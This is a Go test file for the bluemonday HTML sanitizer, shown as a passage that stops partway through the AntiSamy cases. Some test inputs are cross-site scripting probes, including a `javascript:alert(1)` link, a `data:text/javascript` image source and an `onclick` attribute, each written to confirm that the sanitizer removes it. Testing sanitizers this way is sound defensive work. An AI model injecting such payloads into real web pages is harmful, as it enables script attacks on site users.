// Copyright (c) 2014, David Kitchen <david@buro9.com>
//
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// * Redistributions of source code must retain the above copyright notice, this
//   list of conditions and the following disclaimer.
//
// * Redistributions in binary form must reproduce the above copyright notice,
//   this list of conditions and the following disclaimer in the documentation
//   and/or other materials provided with the distribution.
//
// * Neither the name of the organisation (Microcosm) nor the names of its
//   contributors may be used to endorse or promote products derived from
//   this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

package bluemonday

import (
	"bytes"
	"encoding/base64"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"testing"
)

// test is a simple input vs output struct used to construct a slice of many
// tests to run within a single test method.
type test struct {
	in       string
	expected string
}

func TestEmpty(t *testing.T) {
	p := StrictPolicy()

	if p.Sanitize(``) != `` {
		t.Error("Empty string is not empty")
	}
}

func TestSignatureBehaviour(t *testing.T) {
	// https://github.com/microcosm-cc/bluemonday/issues/8
	p := UGCPolicy()

	input := "Hi.\n"

	if output := p.Sanitize(input); output != input {
		t.Errorf(`Sanitize() input = %s, output = %s`, input, output)
	}

	if output := string(p.SanitizeBytes([]byte(input))); output != input {
		t.Errorf(`SanitizeBytes() input = %s, output = %s`, input, output)
	}

	if output := p.SanitizeReader(
		strings.NewReader(input),
	).String(); output != input {

		t.Errorf(`SanitizeReader() input = %s, output = %s`, input, output)
	}

	input = "\t\n \n\t"

	if output := p.Sanitize(input); output != input {
		t.Errorf(`Sanitize() input = %s, output = %s`, input, output)
	}

	if output := string(p.SanitizeBytes([]byte(input))); output != input {
		t.Errorf(`SanitizeBytes() input = %s, output = %s`, input, output)
	}

	if output := p.SanitizeReader(
		strings.NewReader(input),
	).String(); output != input {

		t.Errorf(`SanitizeReader() input = %s, output = %s`, input, output)
	}
}

func TestLinks(t *testing.T) {

	tests := []test{
		{
			in:       `<a href="http://www.google.com">`,
			expected: `<a href="http://www.google.com" rel="nofollow">`,
		},
		{
			in:       `<a href="//www.google.com">`,
			expected: `<a href="//www.google.com" rel="nofollow">`,
		},
		{
			in:       `<a href="/www.google.com">`,
			expected: `<a href="/www.google.com" rel="nofollow">`,
		},
		{
			in:       `<a href="www.google.com">`,
			expected: `<a href="www.google.com" rel="nofollow">`,
		},
		{
			in:       `<a href="javascript:alert(1)">`,
			expected: ``,
		},
		{
			in:       `<a href="#">`,
			expected: ``,
		},
		{
			in:       `<a href="#top">`,
			expected: `<a href="#top" rel="nofollow">`,
		},
		{
			in:       `<a href="?q=1">`,
			expected: `<a href="?q=1" rel="nofollow">`,
		},
		{
			in:       `<a href="?q=1&r=2">`,
			expected: `<a href="?q=1&amp;r=2" rel="nofollow">`,
		},
		{
			in:       `<a href="?q=1&q=2">`,
			expected: `<a href="?q=1&amp;q=2" rel="nofollow">`,
		},
		{
			in:       `<a href="?q=%7B%22value%22%3A%22a%22%7D">`,
			expected: `<a href="?q=%7B%22value%22%3A%22a%22%7D" rel="nofollow">`,
		},
		{
			in:       `<a href="?q=1&r=2&s=:foo@">`,
			expected: `<a href="?q=1&amp;r=2&amp;s=:foo@" rel="nofollow">`,
		},
		{
			in:       `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==" alt="Red dot" />`,
			expected: `<img alt="Red dot"/>`,
		},
		{
			in:       `<img src="giraffe.gif" />`,
			expected: `<img src="https://proxy.example.com/?u=giraffe.gif"/>`,
		},
		{
			in:       `<img src="giraffe.gif?height=500&amp;width=500&amp;flag" />`,
			expected: `<img src="https://proxy.example.com/?u=giraffe.gif?height=500&amp;width=500&amp;flag"/>`,
		},
	}

	p := UGCPolicy()
	p.RequireParseableURLs(true)
	p.RewriteSrc(func(u *url.URL) {
		// Proxify all requests to "https://proxy.example.com/?u=http://example.com/"
		// This is a contrived example, but it shows how to rewrite URLs
		// to proxy all requests through a single URL.

		url := u.String()
		u.Scheme = "https"
		u.Host = "proxy.example.com"
		u.Path = "/"
		u.RawQuery = "u=" + url
	})

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestLinkTargets(t *testing.T) {

	tests := []test{
		{
			in:       `<a href="http://www.google.com">`,
			expected: `<a href="http://www.google.com" rel="nofollow noopener" target="_blank">`,
		},
		{
			in:       `<a href="//www.google.com">`,
			expected: `<a href="//www.google.com" rel="nofollow noopener" target="_blank">`,
		},
		{
			in:       `<a href="/www.google.com">`,
			expected: `<a href="/www.google.com">`,
		},
		{
			in:       `<a href="www.google.com">`,
			expected: `<a href="www.google.com">`,
		},
		{
			in:       `<a href="javascript:alert(1)">`,
			expected: ``,
		},
		{
			in:       `<a href="#">`,
			expected: ``,
		},
		{
			in:       `<a href="#top">`,
			expected: `<a href="#top">`,
		},
		{
			in:       `<a href="?q=1">`,
			expected: `<a href="?q=1">`,
		},
		{
			in:       `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==" alt="Red dot" />`,
			expected: `<img alt="Red dot"/>`,
		},
		{
			in:       `<img src="giraffe.gif" />`,
			expected: `<img src="giraffe.gif"/>`,
		},
	}

	p := UGCPolicy()
	p.RequireParseableURLs(true)
	p.RequireNoFollowOnLinks(false)
	p.RequireNoFollowOnFullyQualifiedLinks(true)
	p.AddTargetBlankToFullyQualifiedLinks(true)

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestStyling(t *testing.T) {

	tests := []test{
		{
			in:       `<span class="foo">Hello World</span>`,
			expected: `<span class="foo">Hello World</span>`,
		},
		{
			in:       `<span class="foo bar654">Hello World</span>`,
			expected: `<span class="foo bar654">Hello World</span>`,
		},
	}

	p := UGCPolicy()
	p.AllowStyling()

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestEmptyAttributes(t *testing.T) {

	p := UGCPolicy()
	// Do not do this, especially without a Matching() clause, this is a test
	p.AllowAttrs("disabled").OnElements("textarea")

	tests := []test{
		// Empty elements
		{
			in: `<textarea>text</textarea><textarea disabled></textarea>` +
				`<div onclick='redirect()'><span>Styled by span</span></div>`,
			expected: `<textarea>text</textarea><textarea disabled=""></textarea>` +
				`<div><span>Styled by span</span></div>`,
		},
		{
			in:       `foo<br />bar`,
			expected: `foo<br/>bar`,
		},
		{
			in:       `foo<br/>bar`,
			expected: `foo<br/>bar`,
		},
		{
			in:       `foo<br>bar`,
			expected: `foo<br>bar`,
		},
		{
			in:       `foo<hr noshade>bar`,
			expected: `foo<hr>bar`,
		},
	}

	for ii, test := range tests {
		out := p.Sanitize(test.in)
		if out != test.expected {
			t.Errorf(
				"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
				ii,
				test.in,
				out,
				test.expected,
			)
		}
	}
}

func TestDataAttributes(t *testing.T) {

	p := UGCPolicy()
	p.AllowDataAttributes()

	tests := []test{
		{
			in:       `<p data-cfg="dave">text</p>`,
			expected: `<p data-cfg="dave">text</p>`,
		},
		{
			in:       `<p data-component="dave">text</p>`,
			expected: `<p data-component="dave">text</p>`,
		},
		{
			in:       `<p data-semicolon;="dave">text</p>`,
			expected: `<p>text</p>`,
		},
		{
			in:       `<p data-xml-prefix="dave">text</p>`,
			expected: `<p>text</p>`,
		},
	}

	for ii, test := range tests {
		out := p.Sanitize(test.in)
		if out != test.expected {
			t.Errorf(
				"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
				ii,
				test.in,
				out,
				test.expected,
			)
		}
	}
}

func TestDataUri(t *testing.T) {

	p := UGCPolicy()
	p.AllowURLSchemeWithCustomPolicy(
		"data",
		func(url *url.URL) (allowUrl bool) {
			// Allows PNG images only
			const prefix = "image/png;base64,"
			if !strings.HasPrefix(url.Opaque, prefix) {
				return false
			}
			if _, err := base64.StdEncoding.DecodeString(url.Opaque[len(prefix):]); err != nil {
				return false
			}
			if url.RawQuery != "" || url.Fragment != "" {
				return false
			}
			return true
		},
	)

	tests := []test{
		{
			in:       `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==">`,
			expected: `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==">`,
		},
		{
			in:       `<img src="data:text/javascript;charset=utf-8,alert('hi');">`,
			expected: ``,
		},
		{
			in:       `<img src="data:image/png;base64,charset=utf-8,alert('hi');">`,
			expected: ``,
		},
		{
			in:       `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4-_8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==">`,
			expected: ``,
		},
	}

	for ii, test := range tests {
		out := p.Sanitize(test.in)
		if out != test.expected {
			t.Errorf(
				"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
				ii,
				test.in,
				out,
				test.expected,
			)
		}
	}
}

func TestGlobalURLPatternsViaCustomPolicy(t *testing.T) {

	p := UGCPolicy()
	// youtube embeds
	p.AllowElements("iframe")
	p.AllowAttrs("width", "height", "frameborder").Matching(Integer).OnElements("iframe")
	p.AllowAttrs("allow").Matching(regexp.MustCompile(`^(([\p{L}\p{N}_-]+)(; )?)+$`)).OnElements("iframe")
	p.AllowAttrs("allowfullscreen").OnElements("iframe")
	p.AllowAttrs("src").OnElements("iframe")
	// These clobber... so you only get one and it applies to URLs everywhere
	p.AllowURLSchemeWithCustomPolicy("mailto", func(url *url.URL) (allowUrl bool) { return false })
	p.AllowURLSchemeWithCustomPolicy("http", func(url *url.URL) (allowUrl bool) { return false })
	p.AllowURLSchemeWithCustomPolicy(
		"https",
		func(url *url.URL) bool {
			// Allow YouTube
			return url.Host == `www.youtube.com`
		},
	)

	tests := []test{
		{
			in:       `<iframe width="560" height="315" src="https://www.youtube.com/embed/lJIrF4YjHfQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`,
			expected: `<iframe width="560" height="315" src="https://www.youtube.com/embed/lJIrF4YjHfQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>`,
		},
		{
			in:       `<iframe width="560" height="315" src="htt://www.vimeo.com/embed/lJIrF4YjHfQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`,
			expected: `<iframe width="560" height="315" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>`,
		},
	}

	for ii, test := range tests {
		out := p.Sanitize(test.in)
		if out != test.expected {
			t.Errorf(
				"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
				ii,
				test.in,
				out,
				test.expected,
			)
		}
	}
}

func TestELementURLPatternsMatching(t *testing.T) {

	p := UGCPolicy()
	// youtube embeds
	p.AllowElements("iframe")
	p.AllowAttrs("width", "height", "frameborder").Matching(Integer).OnElements("iframe")
	p.AllowAttrs("allow").Matching(regexp.MustCompile(`^(([\p{L}\p{N}_-]+)(; )?)+$`)).OnElements("iframe")
	p.AllowAttrs("allowfullscreen").OnElements("iframe")
	p.AllowAttrs("src").Matching(regexp.MustCompile(`^https://www.youtube.com/.*$`)).OnElements("iframe")

	tests := []test{
		{
			in:       `<iframe width="560" height="315" src="https://www.youtube.com/embed/lJIrF4YjHfQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`,
			expected: `<iframe width="560" height="315" src="https://www.youtube.com/embed/lJIrF4YjHfQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>`,
		},
		{
			in:       `<iframe width="560" height="315" src="htt://www.vimeo.com/embed/lJIrF4YjHfQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`,
			expected: `<iframe width="560" height="315" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>`,
		},
	}

	for ii, test := range tests {
		out := p.Sanitize(test.in)
		if out != test.expected {
			t.Errorf(
				"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
				ii,
				test.in,
				out,
				test.expected,
			)
		}
	}
}

func TestAntiSamy(t *testing.T) {

	standardUrls := regexp.MustCompile(`(?i)^https?|mailto`)

	p := NewPolicy()

	p.AllowElements(
		"a", "b", "br", "div", "font", "i", "img", "input", "li", "ol", "p",
		"span", "td", "ul",
	)
	p.AllowAttrs("checked", "type").OnElements("input")
	p.AllowAttrs("color").OnElements("font")
	p.AllowAttrs("href").Matching(standardUrls).OnElements("a")
	p.AllowAttrs("src").Matching(standardUrls).OnElements("img")
	p.AllowAttrs("class", "id", "title").Globally()
	p.AllowAttrs("char").Matching(
		regexp.MustCompile(`p{L}`), // Single character or HTML entity only
	).OnElements("td")

	tests := []test{
		// Base64 strings
		//
		// first string is
		// <a - href="http://www.owasp.org">click here</a>
		{
			in:       `PGEgLSBocmVmPSJodHRwOi8vd3d3Lm93YXNwLm9yZyI+Y2xpY2sgaGVyZTwvYT4=`,
			expected: `PGEgLSBocmVmPSJodHRwOi8vd3d3Lm93YXNwLm9yZyI+Y2xpY2sgaGVyZTwvYT4=`,
		},
		// the rest are randomly generated 300 byte sequences which generate
		// parser errors, turned into Strings
		{
			in:       `uz0sEy5aDiok6oufQRaYPyYOxbtlACRnfrOnUVIbOstiaoB95iw+dJYuO5sI9nudhRtSYLANlcdgO0pRb+65qKDwZ5o6GJRMWv4YajZk+7Q3W/GN295XmyWUpxuyPGVi7d5fhmtYaYNW6vxyKK1Wjn9IEhIrfvNNjtEF90vlERnz3wde4WMaKMeciqgDXuZHEApYmUcu6Wbx4Q6WcNDqohAN/qCli74tvC+Umy0ZsQGU7E+BvJJ1tLfMcSzYiz7Q15ByZOYrA2aa0wDu0no3gSatjGt6aB4h30D9xUP31LuPGZ2GdWwMfZbFcfRgDSh42JPwa1bODmt5cw0Y8ACeyrIbfk9IkX1bPpYfIgtO7TwuXjBbhh2EEixOZ2YkcsvmcOSVTvraChbxv6kP`,
			expected: `uz0sEy5aDiok6oufQRaYPyYOxbtlACRnfrOnUVIbOstiaoB95iw+dJYuO5sI9nudhRtSYLANlcdgO0pRb+65qKDwZ5o6GJRMWv4YajZk+7Q3W/GN295XmyWUpxuyPGVi7d5fhmtYaYNW6vxyKK1Wjn9IEhIrfvNNjtEF90vlERnz3wde4WMaKMeciqgDXuZHEApYmUcu6Wbx4Q6WcNDqohAN/qCli74tvC+Umy0ZsQGU7E+BvJJ1tLfMcSzYiz7Q15ByZOYrA2aa0wDu0no3gSatjGt6aB4h30D9xUP31LuPGZ2GdWwMfZbFcfRgDSh42JPwa1bODmt5cw0Y8ACeyrIbfk9IkX1bPpYfIgtO7TwuXjBbhh2EEixOZ2YkcsvmcOSVTvraChbxv6kP`,
		},
		{
			in:       `PIWjMV4y+MpuNLtcY3vBRG4ZcNaCkB9wXJr3pghmFA6rVXAik+d5lei48TtnHvfvb5rQZVceWKv9cR/9IIsLokMyN0omkd8j3TV0DOh3JyBjPHFCu1Gp4Weo96h5C6RBoB0xsE4QdS2Y1sq/yiha9IebyHThAfnGU8AMC4AvZ7DDBccD2leZy2Q617ekz5grvxEG6tEcZ3fCbJn4leQVVo9MNoerim8KFHGloT+LxdgQR6YN5y1ii3bVGreM51S4TeANujdqJXp8B7B1Gk3PKCRS2T1SNFZedut45y+/w7wp5AUQCBUpIPUj6RLp+y3byWhcbZbJ70KOzTSZuYYIKLLo8047Fej43bIaghJm0F9yIKk3C5gtBcw8T5pciJoVXrTdBAK/8fMVo29P`,
			expected: `PIWjMV4y+MpuNLtcY3vBRG4ZcNaCkB9wXJr3pghmFA6rVXAik+d5lei48TtnHvfvb5rQZVceWKv9cR/9IIsLokMyN0omkd8j3TV0DOh3JyBjPHFCu1Gp4Weo96h5C6RBoB0xsE4QdS2Y1sq/yiha9IebyHThAfnGU8AMC4AvZ7DDBccD2leZy2Q617ekz5grvxEG6tEcZ3fCbJn4leQVVo9MNoerim8KFHGloT+LxdgQR6YN5y1ii3bVGreM51S4TeANujdqJXp8B7B1Gk3PKCRS2T1SNFZedut45y+/w7wp5AUQCBUpIPUj6RLp+y3byWhcbZbJ70KOzTSZuYYIKLLo8047Fej43bIaghJm0F9yIKk3C5gtBcw8T5pciJoVXrTdBAK/8fMVo29P`,
		},
		{
			in:       `uCk7HocubT6KzJw2eXpSUItZFGkr7U+D89mJw70rxdqXP2JaG04SNjx3dd84G4bz+UVPPhPO2gBAx2vHI0xhgJG9T4vffAYh2D1kenmr+8gIHt6WDNeD+HwJeAbJYhfVFMJsTuIGlYIw8+I+TARK0vqjACyRwMDAndhXnDrk4E5U3hyjqS14XX0kIDZYM6FGFPXe/s+ba2886Q8o1a7WosgqqAmt4u6R3IHOvVf5/PIeZrBJKrVptxjdjelP8Xwjq2ujWNtR3/HM1kjRlJi4xedvMRe4Rlxek0NDLC9hNd18RYi0EjzQ0bGSDDl0813yv6s6tcT6xHMzKvDcUcFRkX6BbxmoIcMsVeHM/ur6yRv834o/TT5IdiM9/wpkuICFOWIfM+Y8OWhiU6BK`,
			expected: `uCk7HocubT6KzJw2eXpSUItZFGkr7U+D89mJw70rxdqXP2JaG04SNjx3dd84G4bz+UVPPhPO2gBAx2vHI0xhgJG9T4vffAYh2D1kenmr+8gIHt6WDNeD+HwJeAbJYhfVFMJsTuIGlYIw8+I+TARK0vqjACyRwMDAndhXnDrk4E5U3hyjqS14XX0kIDZYM6FGFPXe/s+ba2886Q8o1a7WosgqqAmt4u6R3IHOvVf5/PIeZrBJKrVptxjdjelP8Xwjq2ujWNtR3/HM1kjRlJi4xedvMRe4Rlxek0NDLC9hNd18RYi0EjzQ0bGSDDl0813yv6s6tcT6xHMzKvDcUcFRkX6BbxmoIcMsVeHM/ur6yRv834o/TT5IdiM9/wpkuICFOWIfM+Y8OWhiU6BK`,
		},
		{
			in:       `Bb6Cqy6stJ0YhtPirRAQ8OXrPFKAeYHeuZXuC1qdHJRlweEzl4F2z/ZFG7hzr5NLZtzrRG3wm5TXl6Aua5G6v0WKcjJiS2V43WB8uY1BFK1d2y68c1gTRSF0u+VTThGjz+q/R6zE8HG8uchO+KPw64RehXDbPQ4uadiL+UwfZ4BzY1OHhvM5+2lVlibG+awtH6qzzx6zOWemTih932Lt9mMnm3FzEw7uGzPEYZ3aBV5xnbQ2a2N4UXIdm7RtIUiYFzHcLe5PZM/utJF8NdHKy0SPaKYkdXHli7g3tarzAabLZqLT4k7oemKYCn/eKRreZjqTB2E8Kc9Swf3jHDkmSvzOYE8wi1vQ3X7JtPcQ2O4muvpSa70NIE+XK1CgnnsL79Qzci1/1xgkBlNq`,
			expected: `Bb6Cqy6stJ0YhtPirRAQ8OXrPFKAeYHeuZXuC1qdHJRlweEzl4F2z/ZFG7hzr5NLZtzrRG3wm5TXl6Aua5G6v0WKcjJiS2V43WB8uY1BFK1d2y68c1gTRSF0u+VTThGjz+q/R6zE8HG8uchO+KPw64RehXDbPQ4uadiL+UwfZ4BzY1OHhvM5+2lVlibG+awtH6qzzx6zOWemTih932Lt9mMnm3FzEw7uGzPEYZ3aBV5xnbQ2a2N4UXIdm7RtIUiYFzHcLe5PZM/utJF8NdHKy0SPaKYkdXHli7g3tarzAabLZqLT4k7oemKYCn/eKRreZjqTB2E8Kc9Swf3jHDkmSvzOYE8wi1vQ3X7JtPcQ2O4muvpSa70NIE+XK1CgnnsL79Qzci1/1xgkBlNq`,
		},
		{
			in:       `FZNVr4nOICD1cNfAvQwZvZWi+P4I2Gubzrt+wK+7gLEY144BosgKeK7snwlA/vJjPAnkFW72APTBjY6kk4EOyoUef0MxRnZEU11vby5Ru19eixZBFB/SVXDJleLK0z3zXXE8U5Zl5RzLActHakG8Psvdt8TDscQc4MPZ1K7mXDhi7FQdpjRTwVxFyCFoybQ9WNJNGPsAkkm84NtFb4KjGpwVC70oq87tM2gYCrNgMhBfdBl0bnQHoNBCp76RKdpq1UAY01t1ipfgt7BoaAr0eTw1S32DezjfkAz04WyPTzkdBKd3b44rX9dXEbm6szAz0SjgztRPDJKSMELjq16W2Ua8d1AHq2Dz8JlsvGzi2jICUjpFsIfRmQ/STSvOT8VsaCFhwL1zDLbn5jCr`,
			expected: `FZNVr4nOICD1cNfAvQwZvZWi+P4I2Gubzrt+wK+7gLEY144BosgKeK7snwlA/vJjPAnkFW72APTBjY6kk4EOyoUef0MxRnZEU11vby5Ru19eixZBFB/SVXDJleLK0z3zXXE8U5Zl5RzLActHakG8Psvdt8TDscQc4MPZ1K7mXDhi7FQdpjRTwVxFyCFoybQ9WNJNGPsAkkm84NtFb4KjGpwVC70oq87tM2gYCrNgMhBfdBl0bnQHoNBCp76RKdpq1UAY01t1ipfgt7BoaAr0eTw1S32DezjfkAz04WyPTzkdBKd3b44rX9dXEbm6szAz0SjgztRPDJKSMELjq16W2Ua8d1AHq2Dz8JlsvGzi2jICUjpFsIfRmQ/STSvOT8VsaCFhwL1zDLbn5jCr`,
		},
		{
			in:       `RuiRkvYjH2FcCjNzFPT2PJWh7Q6vUbfMadMIEnw49GvzTmhk4OUFyjY13GL52JVyqdyFrnpgEOtXiTu88Cm+TiBI7JRh0jRs3VJRP3N+5GpyjKX7cJA46w8PrH3ovJo3PES7o8CSYKRa3eUs7BnFt7kUCvMqBBqIhTIKlnQd2JkMNnhhCcYdPygLx7E1Vg+H3KybcETsYWBeUVrhRl/RAyYJkn6LddjPuWkDdgIcnKhNvpQu4MMqF3YbzHgyTh7bdWjy1liZle7xR/uRbOrRIRKTxkUinQGEWyW3bbXOvPO71E7xyKywBanwg2FtvzOoRFRVF7V9mLzPSqdvbM7VMQoLFob2UgeNLbVHkWeQtEqQWIV5RMu3+knhoqGYxP/3Srszp0ELRQy/xyyD`,
			expected: `RuiRkvYjH2FcCjNzFPT2PJWh7Q6vUbfMadMIEnw49GvzTmhk4OUFyjY13GL52JVyqdyFrnpgEOtXiTu88Cm+TiBI7JRh0jRs3VJRP3N+5GpyjKX7cJA46w8PrH3ovJo3PES7o8CSYKRa3eUs7BnFt7kUCvMqBBqIhTIKlnQd2JkMNnhhCcYdPygLx7E1Vg+H3KybcETsYWBeUVrhRl/RAyYJkn6LddjPuWkDdgIcnKhNvpQu4MMqF3YbzHgyTh7bdWjy1liZle7xR/uRbOrRIRKTxkUinQGEWyW3bbXOvPO71E7xyKywBanwg2FtvzOoRFRVF7V9mLzPSqdvbM7VMQoLFob2UgeNLbVHkWeQtEqQWIV5RMu3+knhoqGYxP/3Srszp0ELRQy/xyyD`,
		},
		{
			in:       `mqBEVbNnL929CUA3sjkOmPB5dL0/a0spq8LgbIsJa22SfP580XduzUIKnCtdeC9TjPB/GEPp/LvEUFaLTUgPDQQGu3H5UCZyjVTAMHl45me/0qISEf903zFFqW5Lk3TS6iPrithqMMvhdK29Eg5OhhcoHS+ALpn0EjzUe86NywuFNb6ID4o8aF/ztZlKJegnpDAm3JuhCBauJ+0gcOB8GNdWd5a06qkokmwk1tgwWat7cQGFIH1NOvBwRMKhD51MJ7V28806a3zkOVwwhOiyyTXR+EcDA/aq5acX0yailLWB82g/2GR/DiaqNtusV+gpcMTNYemEv3c/xLkClJc29DSfTsJGKsmIDMqeBMM7RRBNinNAriY9iNX1UuHZLr/tUrRNrfuNT5CvvK1K`,
			expected: `mqBEVbNnL929CUA3sjkOmPB5dL0/a0spq8LgbIsJa22SfP580XduzUIKnCtdeC9TjPB/GEPp/LvEUFaLTUgPDQQGu3H5UCZyjVTAMHl45me/0qISEf903zFFqW5Lk3TS6iPrithqMMvhdK29Eg5OhhcoHS+ALpn0EjzUe86NywuFNb6ID4o8aF/ztZlKJegnpDAm3JuhCBauJ+0gcOB8GNdWd5a06qkokmwk1tgwWat7cQGFIH1NOvBwRMKhD51MJ7V28806a3zkOVwwhOiyyTXR+EcDA/aq5acX0yailLWB82g/2GR/DiaqNtusV+gpcMTNYemEv3c/xLkClJc29DSfTsJGKsmIDMqeBMM7RRBNinNAriY9iNX1UuHZLr/tUrRNrfuNT5CvvK1K`,
		},
		{
			in:       `IMcfbWZ/iCa/LDcvMlk6LEJ0gDe4ohy2Vi0pVBd9aqR5PnRj8zGit8G2rLuNUkDmQ95bMURasmaPw2Xjf6SQjRk8coIHDLtbg/YNQVMabE8pKd6EaFdsGWJkcFoonxhPR29aH0xvjC4Mp3cJX3mjqyVsOp9xdk6d0Y2hzV3W/oPCq0DV03pm7P3+jH2OzoVVIDYgG1FD12S03otJrCXuzDmE2LOQ0xwgBQ9sREBLXwQzUKfXH8ogZzjdR19pX9qe0rRKMNz8k5lqcF9R2z+XIS1QAfeV9xopXA0CeyrhtoOkXV2i8kBxyodDp7tIeOvbEfvaqZGJgaJyV8UMTDi7zjwNeVdyKa8USH7zrXSoCl+Ud5eflI9vxKS+u9Bt1ufBHJtULOCHGA2vimkU`,
			expected: `IMcfbWZ/iCa/LDcvMlk6LEJ0gDe4ohy2Vi0pVBd9aqR5PnRj8zGit8G2rLuNUkDmQ95bMURasmaPw2Xjf6SQjRk8coIHDLtbg/YNQVMabE8pKd6EaFdsGWJkcFoonxhPR29aH0xvjC4Mp3cJX3mjqyVsOp9xdk6d0Y2hzV3W/oPCq0DV03pm7P3+jH2OzoVVIDYgG1FD12S03otJrCXuzDmE2LOQ0xwgBQ9sREBLXwQzUKfXH8ogZzjdR19pX9qe0rRKMNz8k5lqcF9R2z+XIS1QAfeV9xopXA0CeyrhtoOkXV2i8kBxyodDp7tIeOvbEfvaqZGJgaJyV8UMTDi7zjwNeVdyKa8USH7zrXSoCl+Ud5eflI9vxKS+u9Bt1ufBHJtULOCHGA2vimkU`,
		},
		{
			in:       `AqC2sr44HVueGzgW13zHvJkqOEBWA8XA66ZEb3EoL1ehypSnJ07cFoWZlO8kf3k57L1fuHFWJ6quEdLXQaT9SJKHlUaYQvanvjbBlqWwaH3hODNsBGoK0DatpoQ+FxcSkdVE/ki3rbEUuJiZzU0BnDxH+Q6FiNsBaJuwau29w24MlD28ELJsjCcUVwtTQkaNtUxIlFKHLj0++T+IVrQH8KZlmVLvDefJ6llWbrFNVuh674HfKr/GEUatG6KI4gWNtGKKRYh76mMl5xH5qDfBZqxyRaKylJaDIYbx5xP5I4DDm4gOnxH+h/Pu6dq6FJ/U3eDio/KQ9xwFqTuyjH0BIRBsvWWgbTNURVBheq+am92YBhkj1QmdKTxQ9fQM55O8DpyWzRhky0NevM9j`,
